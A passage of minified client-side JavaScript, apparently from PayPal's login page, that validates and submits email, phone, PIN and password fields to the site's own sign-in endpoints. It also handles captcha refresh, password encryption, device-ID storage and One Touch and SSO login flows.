p.phoneCode),j&&("inputPassword"===p.splitLoginContext&&p.login_phone&&(p.phoneCode=E.value),"inputPhone"===p.splitLoginContext&&s.field?(s.field.setAttribute("disabled","disabled"),s.field.value=""):"inputEmail"===p.splitLoginContext&&f.field&&(f.field.setAttribute("disabled","disabled"),f.field.value="")),d&&d.field&&(p.captcha=d.field.value),v&&(p.rememberProfile=v.checked),login.utils.isInContextIntegration()&&(p.isInContextCheckout=!0),getEventTarget(e);var T=Date.now?Date.now():(new Date).getTime();try{var N;(N=JSON.parse(window.localStorage.getItem("ulData"))||{}).startTime=T,window.localStorage.setItem("ulData",JSON.stringify(N))}catch(C){login.logger.log({evt:"UNIFIED_LOGIN",data:"local_storage_error_out",calEvent:!0,status:"ERROR"}),login.logger.pushLogs()}$("body").data("loadStartTime");var L=$("body").data("isCookiedUser");login.utils.logCPLData({startTime:login.utils.pubCredPageRenderEndTime,status:"success",flowName:L?"Process Next Btn Click Cookied":"Process Next Btn Click Uncookied"}),$.ajax({url:S.getAttribute("action"),data:p,success:login.utils.successfulXhrHandler,fail:login.utils.failedXhrSubmitHandler})}}function sn(){login.utils.hideSpinner(),login.utils.hideSpinnerMessage(),d&&d.removeAttribute("disabled"),u.field&&(u.field.value=""),login.logger.log({evt:n,data:"XHR_FAILED",calEvent:!0}),login.logger.pushLogs(),login.utils.failedXhrSubmitHandler()}function on(e){(e=e||{})._csrf=document.querySelector("#token").value,login.utils.showSpinner(),$.ajax({type:"POST",url:"/signin",data:e,dataType:"json",success:function(e){return e?(login.utils.setCSRFToken(e._csrf),function rn(e){e=e||{};var t=document.querySelector("#keychain-interstitial"),r=document.querySelector("#content"),i=e.isSuaRequired,s=e.isKeychainOptinRequired,o=e.returnUrl||"/signin";if(d&&d.removeAttribute("disabled"),o&&document.body.setAttribute("data-return-url",o),login.overlayUtils.isEligibleToShowOverlay(e)&&(!e.notifications||!e.notifications.msg))return login.logger.log({evt:n,data:"XHR_LOGIN_SUCCESS",calEvent:!0}),login.logger.pushLogs(),login.overlayUtils.showOverlay(e);if(i&&o)return login.utils.hideSpinner(),login.utils.hideSpinnerMessage(),login.logger.log({evt:n,data:"XHR_LOGIN_SUCCESS",calEvent:!0}),login.logger.pushLogs(),login.sua(e);if(s&&o)return login.utils.hideSpinner(),login.utils.hideSpinnerMessage(),t&&$(t).removeClass("hide"),r&&$(r).addClass("hide"),login.logger.log({evt:n,data:"XHR_LOGIN_SUCCESS",calEvent:!0}),login.logger.pushLogs(),login.keychain(e);if(o&&!e.notifications)return login.logger.log({evt:n,data:"XHR_LOGIN_SUCCESS",calEvent:!0}),login.logger.pushLogs(),window.location.href=o;if(e.showSpinnerUpfront||(login.utils.hideSpinner(),login.utils.hideSpinnerMessage()),e.notifications&&e.notifications.msg){var a=document.querySelector(".notifications"),f=document.createElement("p");f.innerHTML=e.notifications.msg,f.className+="notification "+(e.notifications.type||""),f.setAttribute("role","alert"),a.innerHTML="",a.appendChild(f)}u.field&&(u.field.value="");var l=document.querySelector("#emailPageSwitch");return l&&addEvent(l,"click",(function(e){eventPreventDefault(e),kt="email",login.utils.switchToEmailHandler(e)})),login.logger.log({evt:n,data:"XHR_LOGIN_FAILURE",calEvent:!0}),login.otp&&login.otp.prepareSendPage(e),login.geoEnablement&&login.geoEnablement.setGeoMessage(e),login.logger.pushLogs()}(e)):sn()},fail:function(e){return sn()}})}function an(e){var n,r=document.querySelector(".profileRememberedEmail"),i=$("body").data("isTrackPasswordFieldAutofillEnabled"),o=document.querySelector(".transitioning"),a=document.querySelectorAll("form[name=login] [name]:not(button)")||{},p=login.utils.getActiveCaptchaElement(c),v=Dt(c),m=$("body").data("loadStartTime"),g=$("body").data("isCookiedUser");if(login.utils.beaverLogger({transition_name:"submit_password",status:"success",isRedirect:!0,state:"start"}),F&&"phone"===kt&&s.field?Gt(s.field.value):function Zt(){var e=document.querySelector('input[name="splitLoginCookiedFallback"]'),t=document.querySelector("#phone"),n=document.querySelector("#email"),r=document.querySelector(".profileDisplayEmail"),i=r&&r.innerHTML;i&&!e&&n&&t&&(n.hasAttribute("disabled")&&!t.hasAttribute("disabled")?(t.value=i,n.value=""):!n.hasAttribute("disabled")&&t.hasAttribute("disabled")&&(n.value=i,t.value=""))}(),St=!0,s&&s.field&&s.field.value&&s.field.value.indexOf("chrome_annotation")>=0&&(s.field.value=s.field.getAttribute("value"),login.logger.log({evt:"UNIFIED_LOGIN_CAL_TYPE",data:"EMAIL_REPLACED_BY_CHROME_ANNOTATION",calEvent:!0}),login.logger.pushLogs()),"email"===kt?(n=Mt(s)&&_t(s,u),!r&&n&&$(s.field).hasClass("validate")&&(n=Pt(s))):function y(){var e=c&&c.value;f.field&&(n=F?Ot(s)&&u.field&&_t(f,u):"inputPassword"===e?u.field&&_t(f,u):l.field&&_t(f,l))}(),i&&function tn(){var e=document.querySelector("form[name=login]"),t=document.querySelector("#password");if(document.querySelector("#btnLogin"),t.matches(":-webkit-autofill")&&Object.prototype.hasOwnProperty.call(window,"getComputedStyle")){var o=(window.getComputedStyle(t).backgroundColor.match(/[0-5]{1,3}/g)||[]).join(",");login.utils.addHiddenElement("passwordFieldAutofillColor",o,e)}}(),"complete"!==document.readyState)return setTimeout((function(){an(e)}),10);if(n){if(W){if(V||J)return setTimeout((function(){an(e)}),10);K=!1,u.field.value=X,u.field.name="encrypted_password",login.logger.log({evt:"GEO_ENABLEMENT",data:"LOGIN_WITH_ENCRYPTED_PASSWORD",calEvent:!0}),login.logger.log({evt:"login_password_type",data:"encrypted_password",instrument:!0})}if(F&&function en(){"email"===kt?f&&f.field&&f.field.setAttribute("disabled","disabled"):s&&s.field&&s.field.setAttribute("disabled","disabled")}(),login.utils.showSpinner(),login.utils.showSpinnerMessage(),login.fn.addFnSyncData(),eventPreventDefault(e),function un(){var t=(login.utils.parseJsonSafe($("body").data("keychainFlagsJson"))||{}).isEligibleForXhrLogin,n=document.querySelector('input[name="isKeychainActivationWithEmailTokenOn8ball"]'),r=document.querySelector('input[name="appleIdpJson"]')||{},i=login.utils.parseJsonSafe(r.value)||{};return!login.utils.isCookieDisabledBrowser()&&!i.isOptin&&!$("body").data("webAuthnOptinEligible")&&(!!login.overlayUtils.isLoginXHREligbleForOverlay()||t&&!n)}()){login.logger.log({evt:"login_type",data:"xhr",instrument:!0}),login.logger.log({evt:t,data:"LOGIN_TYPE_XHR",calEvent:!0}),login.logger.pushLogs(),$(o).addClass("nonTransparentMask"),login.utils.showSpinnerMessage("checkingInfo");p&&p.field&&p.field.value,v&&v.checked;var E=function nn(e,t,n,r){for(var i=document.querySelector(".profileDisplayPhoneCode"),s=document.querySelector("#keepMeLoggedIn"),o=s&&s.checked,u=document.querySelector("#phoneCode"),a={},f=0;f<e.length;f++)e[f].disabled||(a[e[f].name]=e[f].value);return o?a.rememberMe="true":delete a.rememberMe,"inputPassword"===a.splitLoginContext&&a.login_phone&&u&&(a.phoneCode=u.value,delete a.login_email),"inputPassword"===a.splitLoginContext&&!a.login_phone&&i&&""===i.textContent&&(delete a.login_phone,delete a.phoneCode),r&&"inputPassword"===a.splitLoginContext&&a.login_phone&&i&&""!==i.textContent&&(a.phoneCode=i.textContent),a}(a,0,0,j);return on(E)}try{var S=JSON.parse(window.localStorage.getItem("ulData"))||{};login.utils.logCPLData({startTime:g?m:S.ts,status:"success",flowName:g?"Login Form Submit Cookied":"Login Form Submit Uncookied"})}catch(x){login.logger.log({evt:"UNIFIED_LOGIN",data:"local_storage_error_out",calEvent:!0,status:"ERROR"}),login.logger.pushLogs()}login.logger.log({evt:"login_type",data:"form_submit",instrument:!0}),login.logger.log({evt:t,data:"LOGIN_TYPE_FORM_SUBMIT",calEvent:!0}),login.logger.pushLogs(),h&&h.submit(),setTimeout((function(){d.setAttribute("disabled","disabled")}),10)}else eventPreventDefault(e)}function fn(e){var t;return!!St&&(""===(t=e.field.value.replace(mt,""))?(Bt(e),void("email"===e.type&&qt(e))):(It(e),void("email"===e.type&&$(e.field).hasClass("validate")?t.match(gt)?(qt(e),Ft(e,!0)):(Ht(e),jt(e)):Ft(e,!0))))}function ln(e){St=!1,Ft(e)}function cn(e){St=!!$(e.container).hasClass("hasError")}function pn(e){var t=login.utils.getActiveCaptchaElement(c),n=t.audioTag;if(!(!!n.canPlayType&&!!n.canPlayType("audio/mpeg").replace(/no/,"")))return!0;eventPreventDefault(e),t.field.focus(),n.play()}function dn(e){var t=login.utils.getActiveCaptchaElement(c);eventPreventDefault(e),eventStopPropagation(e),$.ajax({type:"POST",url:"/signin/refreshCaptcha",data:{_csrf:document.querySelector("#token").value},dataType:"json",success:function(e){e&&e.captcha&&(t.image.setAttribute("src",e.captcha.captchaImgUrl),t.audioTag.setAttribute("src",e.captcha.captchaAudioUrl),t.playAudioBtn.setAttribute("href",e.captcha.captchaAudioUrl),t.field.value="",$("body").hasClass("desktop")&&t.field.focus())}})}function yn(e){var t="email"===kt?Mt(s):Ot(f),n=getEventTarget(e);eventPreventDefault(e),login.tpdLogin&&login.tpdLogin.instrumentTpdLoginClicked(n.id),document.body.setAttribute("data-tpd-survey-enabled",!1),t&&$(s.field).hasClass("validate")&&(t=Pt(s)),t&&login.tpdLogin&&login.tpdLogin.attemptTpdLogin(n.id)}function bn(e,t){var n=$("body").data("usePassKey"),r=document.querySelector("#password");Rt(),kt="email",login.utils.notYouClickHandler(e,t),n&&r&&!r.hasAttribute("disabled")&&r.setAttribute("disabled","disabled"),s.container&&Ft(s,!0),u.container&&Ft(u,!0),f.container&&Ft(f,!0),l.container&&Ft(l,!0)}var t="UNIFIED_LOGIN",n="XHR_LOGIN",r=document.querySelector("#notifications"),i=document.querySelector('input[name="splitLoginCookiedFallback"]'),s={container:document.querySelector("#login_emaildiv"),field:document.querySelector("#email"),label:document.querySelector('label[for="email"]'),errMsgContainer:document.querySelector("#emailErrorMessage"),errMsg:document.querySelector("#emailErrorMessage .emptyError"),invalidMsg:document.querySelector("#emailErrorMessage .invalidError"),phoneEmailToggleIcon:document.querySelector("#login_emaildiv .icon"),type:"email"},o=document.querySelector(".textInputMask.email"),u={container:document.querySelector("#login_passworddiv"),field:document.querySelector("#password"),errMsgContainer:document.querySelector("#passwordErrorMessage"),errMsg:document.querySelector("#passwordErrorMessage .emptyError")},a={container:document.querySelector("#pinSection")||document.querySelector(".splitPhoneSection"),field:document.querySelector("#phoneCode")},f={container:document.querySelector("#login_phonediv"),field:document.querySelector("#phone"),errMsgContainer:document.querySelector("#phoneErrorMessage"),errMsg:document.querySelector("#phoneErrorMessage .emptyError"),invalidMsg:document.querySelector("#phoneErrorMessage .invalidError")},l={container:document.querySelector("#login_pindiv"),field:document.querySelector("#pin"),errMsgContainer:document.querySelector("#pinErrorMessage"),errMsg:document.querySelector("#pinErrorMessage .emptyError")},c=document.querySelector("input[name=splitLoginContext]"),h=document.querySelector(".proceed"),d=(document.querySelector("#btnNext"),document.querySelector("#btnLogin")),v=document.querySelector("#tryAnotherWayLink"),m=document.querySelector(".actions"),g=document.querySelector("#splitEmailSection")||document.querySelector("#passwordSection"),y=document.querySelector("#splitPhoneSection")||document.querySelector("#pinSection"),b=document.querySelector("#splitPassword")||document.querySelector("#splitPinSection")||document.querySelector("#pinSection"),w=document.querySelector(".email"),E=document.querySelector(".phone"),S=document.querySelector("#loginWithPhoneOption"),x=document.querySelector("#switchToPhone"),T=document.querySelector("#loginWithEmailOption"),N=document.querySelector("#switchToEmail"),C=document.querySelector(".countryPhoneSelectWrapper"),k=document.querySelector("#emailPageSwitch"),L=document.querySelector(".educationMessage"),A=document.querySelector("#emailSubTagLine"),O=document.querySelector("#phoneSubTagLine"),M=document.querySelector(".forgotLink"),_=M&&M.querySelectorAll(".pwrLink"),D=M&&M.querySelector("#pwdIframe"),P=document.querySelector("#moreOptionsMobile"),H=document.querySelector("#moreOptionsDropDown"),B=document.querySelector("#tpdButton"),j=login.utils.isHybridLoginExperience(),F=login.utils.isHybridEditableOnCookied(),I=document.querySelector("#tpdDemo"),R=(document.querySelector('input[name="ctxId"]'),document.querySelector(".keepMeLogin")),U=document.querySelector("#samlSsoLogin"),z=document.querySelector("#contextualLoginToast"),W=document.body.hasAttribute("data-stspublickey"),X="",V=!0,J=!1,K=!0,Q=$("body").data("device_identifier"),G=$("body").data("did_set");if(W){W=document.body.getAttribute("data-stspublickey");var Y=document.body.getAttribute("data-sm2PublicKey");function Z(e){function r(e){var t=function n(e){return btoa(String.fromCharCode.apply(null,new Uint8Array(e)))}(e);X=t,J=!1}function i(n){if(!J&&K)if(J=!0,Y){const i=Y,s=1,o=sm2.doEncrypt(n,i,s);X=btoa(o),J=!1}else window.crypto.subtle.encrypt({name:"RSA-OAEP"},e,function t(e){return(new TextEncoder).encode(e)}(n)).then(r).catch((function(e){throw new Error(e)}))}addEvent(u.field,"keyup",(function(e){i(e.target.value)})),u.field.value&&!J&&K&&i(u.field.value),V=!1}u.field.addEventListener("copy",(function(e){e.preventDefault()})),u.field.addEventListener("paste",(function(e){e.preventDefault()})),document.querySelector(".showPassword").style.display="none",window.crypto.subtle.importKey("jwk",JSON.parse(W),{name:"RSA-OAEP",hash:{name:"SHA-256"}},!0,["encrypt"]).then(Z).catch((function(e){throw new Error(e)}))}if(login.utils.isCookieDisabledBrowser()&&R&&$(R).addClass("hide"),U&&(login.logger.log({evt:"is_saml_link_shown",data:"y",instrument:!0}),login.logger.pushLogs()),z&&(login.logger.log({evt:t,data:"CONTEXTUAL_LOGIN_TOAST_DISPLAYED",calEvent:!0}),setTimeout((function(){$(z).attr("aria-hidden","true"),$(z).hasClass("notVisible")||$(z).addClass("notVisible")}),Number(z.getAttribute("data-timeout"))||7e3)),Q)try{!function tt(){var e=window.indexedDB||window.mozIndexedDB||window.webkitIndexedDB||window.msIndexedDB;if(null!=e){var t=e.open("ul",1);t.onupgradeneeded=function(){t.result.createObjectStore("ulo",{keyPath:"index"}).createIndex("index","index")},t.onsuccess=function(){var e=t.result,n=e.transaction("ulo","readwrite");n.onerror=function(e){var t=e&&e.target&&e.target.errorCode;login.logger.log({evt:"weblls_deviceId_indexedDB",data:"transation_error",instrument:!0}),login.logger.log({evt:"weblls_deviceId_indexedDB",data:"transation_error"+t,calEvent:!0}),login.logger.pushLogs()};var r=n.objectStore("ulo"),s=(r.index("index"),r.get("d_id"));s.onsuccess=function(){G?(s.result&&s.result.value)===Q?(login.logger.log({evt:"weblls_deviceId_indexedDB",data:"deviceId_matches",instrument:!0}),login.logger.log({evt:"weblls_deviceId_indexedDB",data:"deviceId_match",calEvent:!0}),login.logger.pushLogs()):(nt(r,"mismatch"),login.logger.log({evt:"weblls_deviceId_indexedDB",data:"deviceId_mismatch",instrument:!0}),login.logger.log({evt:"weblls_deviceId_indexedDB",data:"deviceId_mismatch",calEvent:!0}),login.logger.pushLogs()):(login.logger.log({evt:"weblls_deviceId_indexedDB",data:"deviceId_not_yet_set",instrument:!0}),login.logger.log({evt:"weblls_deviceId_indexedDB",data:"deviceId_not_yet_set",calEvent:!0}),login.logger.pushLogs(),nt(r,"new"))},s.onerror=function(e){var t=e&&e.target&&e.target.errorCode;login.logger.log({evt:"weblls_deviceId_indexedDB",data:"getData_error",instrument:!0}),login.logger.log({evt:"weblls_deviceId_indexedDB",data:"getData_error"+t,calEvent:!0}),login.logger.pushLogs()},n.oncomplete=function(){e.close()}},t.onerror=function(e){var t=e&&e.target&&e.target.errorCode;login.logger.log({evt:"weblls_deviceId_indexedDB",data:"open_error",instrument:!0}),login.logger.log({evt:"weblls_deviceId_indexedDB",data:"open_error"+t,calEvent:!0}),login.logger.pushLogs()}}}()}catch(et){login.logger.log({evt:"weblls_deviceId_indexedDB",data:"generic_error",instrument:!0}),login.logger.log({evt:"weblls_deviceId_indexedDB",data:"generic_error",calEvent:!0}),login.logger.pushLogs()}j&&(addEvent(s.field,"input",at),addEvent(s.field,"change",at),addEvent(s.field,"input",(function ft(){F&&s.field&&(login.logger.log({evt:"state_name",data:"cookied_user_change_email",instrument:!0}),login.logger.log({evt:"transition_name",data:"cookied_user_change_email",instrument:!0}),login.logger.pushLogs(),s.field.removeEventListener("input",ft))})),addEvent(s.field,"focus",(function lt(){var e=document.querySelector("#password");e&&e.hasAttribute("disabled")&&e.removeAttribute("disabled")})),addEvent(U,"click",(function wn(){login.logger.log({evt:"user_action",data:"saml_link_clicked",instrument:!0}),login.logger.pushLogs()}))),F&&ot(s.field.value),login.pubsub&&(login.pubsub.subscribe("WINDOW_CLICK",(function rt(e){var t=getEventTarget(e);if(H&&e&&t)return $(t).hasClass("moreOptionsInfo")?(eventPreventDefault(e),$(H).hasClass("hide")&&(login.logger.log({evt:"state_name",data:j?"begin_hybrid_pwd":"begin_pwd",instrument:!0}),login.logger.log({evt:"transition_name",data:j?"process_hybrid_pwd_more_opt":"process_pwd_more_opt",instrument:!0}),login.logger.log({evt:"TPD_CLIENT",data:"CLICKED_MORE_OPTIONS",calEvent:!0}),login.logger.pushLogs()),void $(H).removeClass("hide")):void $(H).addClass("hide")})),login.pubsub.subscribe("WINDOW_CLICK",(function it(e){var t=getEventTarget(e);I&&e&&t&&$(I).addClass("hide")})));var ct=document.querySelector("#createAccount");ct&&(ct.onclick=function(e){var t=login.logger.getStateName();login.utils.getOutboundLinksHandler(ct,t,"process_signup")(e)});var ht=document.querySelector("#backToInputEmailLink"),pt=document.querySelector("#ssoInterstitialBackToInputEmailLink"),dt=document.querySelector("#backToEmailPasswordLink"),vt=document.querySelector("#rememberProfileEmail"),mt=/^\s+|\s+$/,gt=/^\S+@\S+\.\S+$/,yt=/[^\d]+/g,bt=/\s/g,wt="PayPal One Touch",Et=/[-().\s]/gi,St=!1,Nt=(document.querySelector("form[name=smartlockForm]"),document.querySelector("#secondaryLoginBtn"),$("body").data("phonePasswordEnabled")),Ct=$("body").data("phonePinEnabled"),kt=function hn(){var e=f.field&&f.field.value;return f.field&&"hidden"!==$(f.field).attr("type")&&(s.field&&s.field.hasAttribute("disabled")||c&&"inputPhone"===c.value)?Ct?"phone":"phonePassword":c&&"inputPin"===c.value||e?"phone":"email"}();s.field&&(s.field.onkeyup=fn.bind(null,s),s.field.onblur=ln.bind(null,s),s.field.onfocus=cn.bind(null,s)),u.field&&(u.field.onkeyup=fn.bind(null,u),u.field.onblur=ln.bind(null,u),u.field.onfocus=cn.bind(null,u)),f.field&&(f.field.onkeyup=fn.bind(null,f),f.field.onblur=ln.bind(null,f),f.field.onfocus=cn.bind(null,f)),l.field&&(l.field.onkeyup=fn.bind(null,l),l.field.onblur=ln.bind(null,l),l.field.onfocus=cn.bind(null,l)),a&&a.field&&(a.field.onchange=function Xt(){var r,e=a.container.querySelector(".countryCode"),t=a.container.querySelector(".phoneCode"),n=a.field;r=function i(){var t=n.options[n.selectedIndex].value.split(" ");return{countryCode:t&&(t[0]||""),phoneCode:t&&(t[1]||"")}}(),$(e).text(r.countryCode),$(t).text(r.phoneCode)},j&&(a.field.onclick=function Vt(){login.logger.log({evt:"state_name",data:"begin_hybrid_login",instrument:!0}),login.logger.log({evt:"transition_name",data:"click_change_country_code",instrument:!0}),login.logger.pushLogs()})),function mn(){function n(e){e.playAudioBtn.onclick=pn,e.refreshCaptchaBtn.onclick=dn,e.field.onkeyup=fn.bind(null,e),e.field.onblur=ln.bind(null,e),e.field.onfocus=cn.bind(null,e)}for(var e=document.querySelectorAll(".captcha-container"),t=0;t<e.length;t++)n(login.utils.getCaptchaDom(e[t]))}(),w&&E?(w.onclick=zt,E.onclick=function Wt(){var e=document.querySelector('input[name="splitLoginContext"]');$(y).removeClass("hide"),$(g).addClass("hide"),L&&!$(b).hasClass("hide")&&$(L).removeClass("hide"),a.field&&a.field.removeAttribute("disabled"),f.field&&f.field.removeAttribute("disabled"),l.field&&l.field.removeAttribute("disabled"),s.field&&s.field.setAttribute("disabled","disabled"),u.field&&u.field.setAttribute("disabled","disabled"),$(M).addClass("hide"),$(m).addClass("phonePresent"),S&&$(S).addClass("hide"),kt="phone",A&&$(A).addClass("hide"),e&&!Nt&&(e.value="inputPassword"===e.value?"inputPin":"inputPhone")}):w&&(w.onclick=function Kt(e,t){eventPreventDefault(e),Rt(),kt="email",login.utils.notYouClickHandler(e,(function(){login.logger.log({evt:"state_name",data:"begin_phone_pwd",instrument:!0}),login.logger.log({evt:"transition_name",data:"prepare_email",instrument:!0}),login.logger.pushLogs(),login.logger.log({evt:"state_name",data:"begin_email",instrument:!0}),login.logger.log({evt:"transition_name",data:"prepare_email",instrument:!0}),login.logger.pushLogs(),"function"==typeof t&&t()}))}),Nt&&x&&(x.onclick=function $t(e){eventPreventDefault(e);var t=document.querySelector('input[name="splitLoginContext"]'),n=document.querySelector(".countryPhoneSelectWrapper");$(y).removeClass("hide"),$(g).addClass("hide"),$(S).addClass("hide"),$(T).removeClass("hide"),Ft(s,!0),a.field&&a.field.removeAttribute("disabled"),f.field&&f.field.removeAttribute("disabled"),f.field.focus(),A&&$(A).addClass("hide"),O&&$(O).removeClass("hide"),s.field&&(s.field.value=""),login.view.updateNotificationView({}),s.field&&s.field.setAttribute("disabled","disabled"),t.value="inputPhone",login.logger.log({evt:"state_name",data:"begin_email",instrument:!0}),login.logger.log({evt:"transition_name",data:"prepare_phone",instrument:!0}),login.logger.pushLogs(),login.logger.log({evt:"state_name",data:"begin_phone",instrument:!0}),login.logger.log({evt:"transition_name",data:"prepare_phone",instrument:!0}),login.logger.pushLogs(),Ct?(l.field&&l.field.removeAttribute("disabled"),u.field&&u.field.setAttribute("disabled","disabled"),kt="phone",$(m).addClass("phonePresent"),$(M).addClass("hide")):(u.field&&u.field.removeAttribute("disabled"),l.field&&l.field.setAttribute("disabled","disabled"),kt="phonePassword",n&&$(n).removeClass("hide"))}),Nt&&N&&(N.onclick=function Jt(e){eventPreventDefault(e);var t=document.querySelector('input[name="splitLoginContext"]');$(g).removeClass("hide"),$(y).addClass("hide"),$(T).addClass("hide"),$(S).removeClass("hide"),L&&$(L).addClass("hide"),Ft(f,!0),s.field&&s.field.removeAttribute("disabled"),u.field&&u.field.removeAttribute("disabled"),s.field.focus(),a.field&&a.field.setAttribute("disabled","disabled"),f.field&&f.field.setAttribute("disabled","disabled"),l.field&&l.field.setAttribute("disabled","disabled"),O&&$(O).addClass("hide"),A&&$(A).removeClass("hide"),$(m).removeClass("phonePresent"),kt="email",t.value="inputEmail",login.logger.log({evt:"state_name",data:"begin_phone",instrument:!0}),login.logger.log({evt:"transition_name",data:"prepare_email",instrument:!0}),login.logger.pushLogs(),login.logger.log({evt:"state_name",data:"begin_email",instrument:!0}),login.logger.log({evt:"transition_name",data:"prepare_email",instrument:!0}),login.logger.pushLogs()}),addEvent(C,"focusin",(function(e){$(C).addClass("focus")})),addEvent(C,"focusout",(function(e){$(C).removeClass("focus")})),v&&(login.utils.attachTryAnotherWayModalHandlers({integrationType:"login"}),login.utils.hideCurrentPageTawOption("login"),addEvent(v,"click",(function(e){login.logger.log({evt:t,data:"LOGIN_CLICKED_TRY_ANOTHER_WAY",calEvent:!0}),login.utils.logTryAnotherWayInstrumentData({page:"password",action:"linkPressed"}),login.logger.pushLogs(),login.utils.showTryAnotherWayModal(e,{integrationType:"login"})}))),k&&addEvent(k,"click",(function(e){eventPreventDefault(e),kt="email",login.utils.switchToEmailHandler(e)})),addEvent(h,"keydown",(function(e){var t=getEventTarget(e);(function(e){return!!e&&(e.key?"Enter"===e.key:e.which?13===e.which:13===e.keyCode)})(e)&&!t.href&&!$(t).hasClass("show-hide-password")&&Qt(e)})),addEvent(h,"submit",Qt),P&&addEvent(P,"click",yn),B&&addEvent(B,"click",yn),ht&&addEvent(ht,"click",(function(e){bn(e,(function(){var e=document.querySelector(".onboardingFlowContentKey"),t=document.querySelector(".pwdContentKey");$("body").data("pwdContentKeyExists")&&($(e).removeClass("hide"),$(t).addClass("hide"))})),j&&ut()})),pt&&addEvent(pt,"click",(function(e){bn(e,(function(){var e=document.querySelector("#ssoInterstitialContainer"),t=$("#content");e&&t&&(e.remove(),t.removeClass("hide")),j&&ut()}))})),dt&&addEvent(dt,"click",(function(e){e.preventDefault(),i?zt():bn(e)})),vt&&(vt.onclick=function vn(e){var t=getEventTarget(e);t&&setTimeout((function(){$(t).hasClass("scTrack:unifiedlogin-rememberme-profile-opt-in")?($(t).removeClass("scTrack:unifiedlogin-rememberme-profile-opt-in"),$(t).addClass("scTrack:unifiedlogin-rememberme-profile-opt-out")):($(t).removeClass("scTrack:unifiedlogin-rememberme-profile-opt-out"),$(t).addClass("scTrack:unifiedlogin-rememberme-profile-opt-in"))}),10)}),login.pubsub&&login.pubsub.subscribe("WINDOW_CLICK",(function gn(e){var n,r,i,t=getEventTarget(e);t&&"iconCloseEducation"===t.id&&(n=document.querySelector(".educationMessage"))&&(r=document.querySelector(".contentContainer"),$(n).addClass("hide"),r&&$(r).removeClass("contentContainerShort"),(i=document.createElement("input")).setAttribute("type","hidden"),i.setAttribute("name","removeEducationMsg"),i.setAttribute("value","true"),$(h).append(i))}))}}(),login.oneTouchLogin=function(){function o(){var t=[],r=document.querySelector('input[name="locale.x"]');t.push({evt:"state_name",data:"Login_UL_RM",instrument:!0}),t.push({evt:"transition_name",data:"prepare_login_UL_RM",instrument:!0}),t.push({evt:"design",data:e.isInContextIntegration()?"in-context":"full-context",instrument:!0}),t.push({evt:"login_method",data:"onetouch",instrument:!0}),r&&t.push({evt:"page_lang",data:r.value,instrument:!0}),t.push({evt:i,data:"PREPARE_PAGE_"+s.toUpperCase(),calEvent:!0}),n.clientLog(t,null)}function a(){for(var v,n=document.querySelectorAll("form[name=login] input[type=hidden]"),r=document.querySelector("input[name=login_email]"),i=document.querySelector("input[name=login_password]"),s=$("body").data("oneTouchUser"),a=$("body").data("oneTouchTenant"),f=login.utils.getIntent(),l=$("body").data("cookieBannerEnabled"),h=($("body").data("isKeychainOptinRequired"),!1),p={_csrf:1,intent:1,flowId:1,ctxId:1,returnUri:1,state:1,"locale.x":1,fn_sync_data:1},d={},m=0;m<n.length;m++)p[n[m].name]&&(d[n[m].name]=n[m].value);if(!d.intent||"prox"!==f&&!d.returnUri||!s)return e.hideSpinner(),void autoLoginfallBackClientLog();d.otLoginIntent=d.intent,d.login_email=r&&r.value,a&&(d.oneTouchTenant=a),e.showSpinner(),o(),$("body").data("xhrTimeoutEnable")&&e.isSpinnerShown()&&!e.isUserAgentIneligibleForTimeout()&&(h=!0),$("#keepMeLogin")&&$("#keepMeLogin").addClass("hide"),v=$("body").data("loadStartTime"),$.ajax({url:"/signin/ot-token",method:"POST",data:d,timeoutEnable:h,success:function(n){var s;if(r&&r.removeAttribute("disabled"),i&&i.removeAttribute("disabled"),n.keychainDeviceToken&&login.keychain)return login.keychain(n);if(n.smartlockOptIn&&login.smartLock)login.smartLock(n);else{if(!n.incompleteContext)return n.returnUrl?(login.utils.logCPLData({startTime:v,status:"success",flowName:"One Touch"}),void(window.location.href=n.returnUrl)):((s=n.notifications)&&function u(e,t){var r,i,n=document.querySelector(".notifications");n&&(r=document.createElement("p"),i=document.createTextNode(e),r.setAttribute("class","notification "+t),r.setAttribute("role","alert"),r.appendChild(i),n.appendChild(r))}(s.msg,s.type),e.hideSpinner(),e.hideSpinnerMessage("secureMessage"),e.hideSpinnerMessage("oneTouchMessage"),autoLoginfallBackClientLog({error_code:"ot_login_failed"}),void(l&&t&&t.showCookieBanner()));window.location.href=window.location.href}},fail:function(n){e.hideSpinner(),login.utils.logCPLData({startTime:v,status:"failure",flowName:"One Touch"}),r&&r.removeAttribute("disabled"),i&&i.removeAttribute("disabled"),e.hideSpinnerMessage("secureMessage"),e.hideSpinnerMessage("oneTouchMessage"),autoLoginfallBackClientLog({error_code:"ot_login_xhr_fail"}),l&&t&&t.showCookieBanner()}})}var e=login.utils,t=login.loadResources,n=login.logger,r=window.PAYPAL.ulData||{},i="ONETOUCH_LOGIN",s=e.getIntent();return function(){var i=$("body").data("oneTouchUser"),s="true"===$("body").data("isKeychainOptinRequired"),o=$("body").data("tpdAutoSend"),u=$("body").data("otpCookiedAutoSend"),f=$("body").data("ssoInterstitial"),l=r.aPayAuth;$("body").data("enableFnSyncPayloadOnOneTouch")&&(n.log({evt:"FN_PAYLOAD",data:"send_fn_sync_data",instrument:!0}),n.pushLogs(),login.fn.addFnSyncData()),l||!i?l&&r.canNotMakePayment?a():!o&&!isAPaySupported()&&!i&&!s&&!u&&!f&&e.hideSpinner():a()}}(),login.singleSignOn=function(){function l(){login.logger.log({evt:"event_name",data:"identity_failed_customer_interaction_occurred",instrument:!0}),login.logger.log({evt:"state_name",data:"sso_login",instrument:!0}),login.logger.log({evt:"transition_name",data:"process_sso_login_failed",instrument:!0}),login.logger.log({evt:u,data:"SSO_LOGIN_FAILED_"+o.toUpperCase(),calEvent:!0}),login.logger.pushLogs()}function c(){var f={},c=$("body").data("ssoDefaultContent"),h=$("body").data("allowNativeWebSsoLogin"),p=document.querySelectorAll("form[name=login] input[type=hidden]"),d=function a(){return r?"inbound_sso_login":"sso_login"}(),v=!1,m=document.title;if(n&&"venmo"===n)e.hideSpinner();else if(r)e.showSpinner(),t&&$(t).addClass("nonTransparentMask");else{if(e.showSpinner(),t&&$(t).addClass("nonTransparentMask"),c){var g=document.querySelector(".transitioning p.oneSecond");document.title=g&&g.textContent||m}c?e.showSpinnerMessage("oneSecond"):e.showSpinnerMessage("secureMessage")}f.ssoViaToken=!0,f.isInboundSso=r,login.fn.updateFnSyncContext({sourceId:"SSO_LOGIN"}),login.fn.addFnSyncData();for(var 